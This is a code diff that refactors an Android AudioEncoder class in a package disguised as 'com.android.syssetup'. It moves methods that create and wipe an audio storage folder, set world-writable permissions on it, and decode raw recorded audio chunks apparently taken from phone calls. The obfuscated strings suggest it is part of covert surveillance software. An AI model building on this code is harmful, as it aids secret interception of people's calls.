@@ -2,12 +2,12 @@ package com.android.syssetup.util;
 
 import android.media.AmrInputStream;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.file.AutoFile;
 import com.android.syssetup.file.Path;
 import com.android.syssetup.resample.Resample;
-import com.android.mm.M;
 import com.musicg.wave.Wave;
 import com.musicg.wave.WaveHeader;
 
@@ -43,6 +43,55 @@ public class AudioEncoder {
 				Check.log(e);
 			}
 		}
+	}
+
+	static public boolean createAudioStorage() {
+		// Create storage directory
+		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
+
+		if (Path.createDirectory(audioStorage) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
+			}
+
+			return false;
+		} else {
+			Execute.chmod(M.e("777"), audioStorage);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
+			}
+
+			return true;
+		}
+	}
+
+	static public String getAudioStorage() {
+		if (audioStorage.length() == 0) {
+			createAudioStorage();
+		}
+
+		return audioStorage;
+	}
+
+	static public boolean deleteAudioStorage() {
+		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
+
+		boolean ret = false;
+
+		File f = new File(audioStorage);
+		if (f.exists() && f.isDirectory()) {
+			for (File file : f.listFiles()) {
+				file.delete();
+			}
+			ret = true;
+		}
+
+		return ret;
+	}
+
+	static private String getAudioDirectoryName() {
+		return audioDirectory;
 	}
 
 	public int getInferredSampleRate() {
@@ -191,7 +240,7 @@ public class AudioEncoder {
 
 		// Resample audio
 		Wave wave = Resample.resampleRaw(header, rawPcm);
-		if(wave == null){
+		if (wave == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resample), Invalid raw sample, samplerate is zero");
 			}
@@ -240,7 +289,7 @@ public class AudioEncoder {
 				blockLen = d.getInt();
 				if (blockLen < 0 || blockLen > d.remaining()) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (decodeRawChunks), OUT of BAND, blockLen: "+ blockLen + " remaining: "+ d.remaining());
+						Check.log(TAG + " (decodeRawChunks), OUT of BAND, blockLen: " + blockLen + " remaining: " + d.remaining());
 					}
 					break;
 				}
@@ -282,7 +331,7 @@ public class AudioEncoder {
 			// Second round extracts only the audio data
 			while (d.remaining() > 0) {
 				epoch = d.getInt();
-				if(Cfg.DEBUG){
+				if (Cfg.DEBUG) {
 					Check.asserts(epoch <= last_epoch, "Last_epoch not correct");
 				}
 				streamType = d.getInt();
@@ -375,54 +424,5 @@ public class AudioEncoder {
 
 	public boolean isLastCallFinished() {
 		return call_finished;
-	}
-
-	static public boolean createAudioStorage() {
-		// Create storage directory
-		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
-
-		if (Path.createDirectory(audioStorage) == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createAudioStorage): audio storage directory cannot be created"); //$NON-NLS-1$
-			}
-
-			return false;
-		} else {
-			Execute.chmod(M.e("777"), audioStorage);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (createAudioStorage): audio storage directory created at " + audioStorage); //$NON-NLS-1$
-			}
-
-			return true;
-		}
-	}
-
-	static public String getAudioStorage() {
-		if (audioStorage.length() == 0) {
-			createAudioStorage();
-		}
-
-		return audioStorage;
-	}
-
-	static public boolean deleteAudioStorage() {
-		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
-
-		boolean ret = false;
-
-		File f = new File(audioStorage);
-		if (f.exists() && f.isDirectory()) {
-			for (File file : f.listFiles()) {
-				file.delete();
-			}
-			ret = true;
-		}
-
-		return ret;
-	}
-
-	static private String getAudioDirectoryName() {
-		return audioDirectory;
 	}
 }
